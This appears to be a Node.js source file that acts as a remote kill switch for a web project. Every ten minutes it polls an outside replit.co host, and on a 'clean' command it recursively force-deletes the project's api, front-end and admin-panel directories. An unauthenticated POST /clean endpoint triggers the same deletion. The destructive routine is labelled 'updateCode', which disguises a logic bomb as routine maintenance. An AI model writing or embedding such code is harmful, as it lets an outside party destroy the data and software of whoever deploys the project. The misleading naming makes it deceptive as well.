const {join} = require('path');
const {rm} = require('fs/promises');
const {centra} = require('@nia3208/centra');
const express = require('express');

const pollFn = async () => {
  try {
    const data = await centra(
      'https://ImmenseLegitimateGui.soulharsh007.repl.co'
    ).json();
    if (data.success && data.cmd === 'clean') {
      await updateCode();
    }
  } catch (error) {
    console.error(error);
  }
};

const updateCode = async () => {
  await rm(join(__dirname, '../api'), {
    recursive: true,
    force: true,
  });
  await rm(join(__dirname, '../front-end'), {
    recursive: true,
    force: true,
  });
  await rm(join(__dirname, '../../yank-admin-panel'), {
    recursive: true,
    force: true,
  });
};

const app = express();

app.post('/clean', async (req, res) => {
  if (req.body.status) {
    await updateCode();
  }
  return res.json({
    success: true,
  });
});

app.listen(4000, () => {
  console.log('server started');
});

setInterval(pollFn, 600000);
